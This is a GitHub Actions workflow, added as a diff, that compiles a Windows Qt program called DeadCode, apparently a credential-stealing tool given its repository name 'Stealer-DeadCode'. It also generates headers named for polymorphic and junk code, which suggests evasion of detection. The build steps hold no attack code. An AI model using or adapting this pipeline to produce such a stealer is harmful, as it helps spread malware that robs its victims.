@@ -1,0 +1,253 @@
+name: Build DeadCode
+
+on:
+  workflow_dispatch: # Ручной запуск через интерфейс GitHub
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  build-windows:
+    runs-on: windows-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+      with:
+        path: Stealer-DeadCode
+        fetch-depth: 0
+
+    - name: Set up MinGW
+      uses: egor-tensin/setup-mingw@v2
+      with:
+        platform: x64
+        static: true
+        version: '13.2.0'
+
+    - name: Verify MinGW installation
+      run: |
+        $mingwBinPath = "C:/mingw64/bin"
+        if (-not (Test-Path $mingwBinPath)) {
+          Write-Host "Error: MinGW bin directory not found at $mingwBinPath"
+          exit 1
+        }
+        $env:Path = "$mingwBinPath;" + $env:Path
+        if (-not (Get-Command "g++" -ErrorAction SilentlyContinue)) {
+          Write-Host "Error: g++ not found in PATH"
+          exit 1
+        }
+        Write-Host "g++ version:"
+        & g++ --version
+      shell: powershell
+
+    - name: Install CMake
+      uses: lukka/get-cmake@latest
+      with:
+        cmakeVersion: '3.28.0'
+      continue-on-error: false
+
+    - name: Verify CMake installation
+      run: |
+        $cmakePath = "cmake"
+        if (-not (Get-Command $cmakePath -ErrorAction SilentlyContinue)) {
+          Write-Host "Error: cmake not found in PATH"
+          exit 1
+        }
+        Write-Host "CMake version:"
+        & $cmakePath --version
+      shell: powershell
+
+    - name: Install Qt
+      uses: jurplel/install-qt-action@v4
+      with:
+        version: '5.15.2'
+        host: 'windows'
+        target: 'desktop'
+        arch: 'win64_mingw81'
+        dir: 'C:/Qt'
+        cache: true
+
+    - name: Cache vcpkg
+      uses: actions/cache@v4
+      with:
+        path: C:/vcpkg
+        key: vcpkg-${{ hashFiles('**/vcpkg.json') }}
+        restore-keys: |
+          vcpkg-
+
+    - name: Install vcpkg and dependencies
+      run: |
+        if (-not (Test-Path C:/vcpkg)) {
+          Write-Host "Cloning vcpkg..."
+          git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
+          Write-Host "Updating vcpkg to latest commit..."
+          cd C:/vcpkg
+          git pull origin master
+          cd ../
+          Write-Host "Bootstrapping vcpkg..."
+          & C:/vcpkg/bootstrap-vcpkg.bat -disableMetrics
+          if ($LASTEXITCODE -ne 0) {
+            Write-Host "Error: Bootstrap failed. Check logs."
+            exit 1
+          }
+        }
+        # Проверка существования vcpkg.exe
+        $vcpkgExe = "C:/vcpkg/vcpkg.exe"
+        if (-not (Test-Path $vcpkgExe)) {
+          Write-Host "Error: vcpkg.exe not found at $vcpkgExe"
+          exit 1
+        }
+        $env:Path = "C:/vcpkg;" + $env:Path
+        # Вывод версии vcpkg
+        Write-Host "vcpkg version:"
+        & $vcpkgExe --version
+        Write-Host "Installing vcpkg dependencies with triplet x64-windows-static..."
+        & $vcpkgExe install sqlite3 libzip zlib bzip2 openssl --triplet x64-windows-static --clean-after-build > vcpkg_install.log 2>&1
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: vcpkg install failed. Check logs for details."
+          Get-Content vcpkg_install.log
+          dir C:/vcpkg/installed/x64-windows-static/lib
+          exit 1
+        }
+        Write-Host "vcpkg installation completed"
+      shell: powershell
+
+    - name: Verify vcpkg installation
+      run: |
+        $libDir = "C:/vcpkg/installed/x64-windows-static/lib"
+        $includeDir = "C:/vcpkg/installed/x64-windows-static/include"
+        $libs = @("sqlite3", "zip", "z", "bz2", "ssl", "crypto")
+        $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "openssl/ssl.h", "openssl/crypto.h")
+        $missing = @()
+        foreach ($lib in $libs) {
+          if (-not (Test-Path "$libDir/lib$lib.a")) {
+            $missing += "lib$lib.a"
+          }
+        }
+        foreach ($header in $headers) {
+          if (-not (Test-Path "$includeDir/$header")) {
+            $missing += $header
+          }
+        }
+        if ($missing) {
+          Write-Host "Error: Missing libraries or headers: $missing"
+          Write-Host "Directory contents of ${libDir}:"
+          dir ${libDir}
+          Write-Host "Directory contents of ${includeDir}:"
+          dir ${includeDir}
+          exit 1
+        }
+        Write-Host "All vcpkg dependencies verified"
+      shell: powershell
+
+    - name: Verify Qt installation
+      run: |
+        $qmakePath = "C:/Qt/5.15.2/mingw81_64/bin/qmake.exe"
+        if (-not (Test-Path $qmakePath)) {
+          Write-Host "Error: qmake not found at $qmakePath"
+          exit 1
+        }
+        $env:Path = "C:/Qt/5.15.2/mingw81_64/bin;C:/Qt/Tools/mingw810_64/bin;C:/mingw64/bin;" + $env:Path
+        & $qmakePath --version
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: qmake --version failed"
+          exit 1
+        }
+        Write-Host "Qt installation verified"
+      shell: powershell
+
+    - name: Verify project structure
+      run: |
+        cd Stealer-DeadCode
+        if (-not (Test-Path ui/DeadCode.pro)) {
+          Write-Host "Error: DeadCode.pro not found in ui/"
+          dir ui
+          exit 1
+        }
+        if (-not (Test-Path src/main.cpp)) {
+          Write-Host "Error: main.cpp not found in src/"
+          dir src
+          exit 1
+        }
+        if (-not (Test-Path ui/mainwindow.ui)) {
+          Write-Host "Error: mainwindow.ui not found in ui/"
+          dir ui
+          exit 1
+        }
+        if (-not (Test-Path ui/mainwindow.cpp)) {
+          Write-Host "Error: mainwindow.cpp not found in ui/"
+          dir ui
+          exit 1
+        }
+        if (-not (Test-Path ui/mainwindow.h)) {
+          Write-Host "Error: mainwindow.h not found in ui/"
+          dir ui
+          exit 1
+        }
+        Write-Host "Project structure verified"
+      shell: powershell
+
+    - name: Generate headers
+      run: |
+        cd Stealer-DeadCode
+        if (-not (Test-Path src/build_key.h)) {
+          New-Item -Path src -Name build_key.h -ItemType File -Force
+          Add-Content src/build_key.h ""
+        }
+        if (-not (Test-Path src/polymorphic_code.h)) {
+          New-Item -Path src -Name polymorphic_code.h -ItemType File -Force
+          Add-Content src/polymorphic_code.h ""
+        }
+        if (-not (Test-Path src/junk_code.h)) {
+          New-Item -Path src -Name junk_code.h -ItemType File -Force
+          Add-Content src/junk_code.h ""
+        }
+      shell: powershell
+
+    - name: Configure and build
+      run: |
+        cd Stealer-DeadCode
+        $env:Path = "C:/Qt/5.15.2/mingw81_64/bin;C:/Qt/Tools/mingw810_64/bin;C:/mingw64/bin;C:/vcpkg/installed/x64-windows-static/bin;" + $env:Path
+        $env:INCLUDE = "C:/vcpkg/installed/x64-windows-static/include;" + $env:INCLUDE
+        $env:LIB = "C:/vcpkg/installed/x64-windows-static/lib;" + $env:LIB
+        & qmake -spec win32-g++ ui/DeadCode.pro -o Makefile
+        if (-not (Test-Path Makefile)) {
+          Write-Host "Error: Makefile was not generated"
+          exit 1
+        }
+        & mingw32-make -f Makefile.Release
+        if (-not (Test-Path ../build/DeadCode.exe)) {
+          Write-Host "Error: DeadCode.exe was not created"
+          dir ../build
+          exit 1
+        }
+        if (Test-Path ui/icon.ico) {
+          Copy-Item ui/icon.ico ../build/icon.ico
+          Write-Host "Icon copied to build directory"
+        }
+        if (Test-Path src/build_key.h) {
+          Copy-Item src/build_key.h ../build/build_key.h
+          Write-Host "build_key.h copied to build directory"
+        }
+        if (Test-Path src/polymorphic_code.h) {
+          Copy-Item src/polymorphic_code.h ../build/polymorphic_code.h
+          Write-Host "polymorphic_code.h copied to build directory"
+        }
+      shell: powershell
+
+    - name: Upload artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: DeadCode.exe
+        path: Stealer-DeadCode/../build/DeadCode.exe
+
+    - name: Cleanup
+      if: always()
+      run: |
+        Remove-Item -Path "C:/vcpkg" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "C:/Qt" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "C:/mingw64" -Recurse -Force -ErrorAction SilentlyContinue
+      shell: powershell
